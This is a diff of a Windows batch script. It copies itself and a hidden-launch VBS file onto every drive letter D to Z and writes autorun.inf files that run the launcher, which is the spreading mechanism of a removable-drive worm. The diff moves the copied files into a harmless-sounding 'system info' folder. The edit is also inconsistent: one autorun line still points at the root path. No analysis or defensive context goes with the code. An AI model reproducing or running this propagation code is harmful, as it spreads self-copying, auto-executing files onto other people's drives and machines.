@@ -24,9 +24,9 @@ goto check_drive
 :Yes
 for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\ (
-        copy "%~f0" "%%d:\AutoRun.bat"
-        copy "RunHidden.vbs" "%%d:\RunHidden.vbs"
-        echo [autorun] > "%%d:\autorun.inf"
+        copy "%~f0" "%%d:\system info\AutoRun.bat"
+        copy "RunHidden.vbs" "%%d:\system info\RunHidden.vbs"
+        echo [autorun] > "%%d:\system info\autorun.inf"
         echo open=RunHidden.vbs >> "%%d:\autorun.inf"
     )
 )
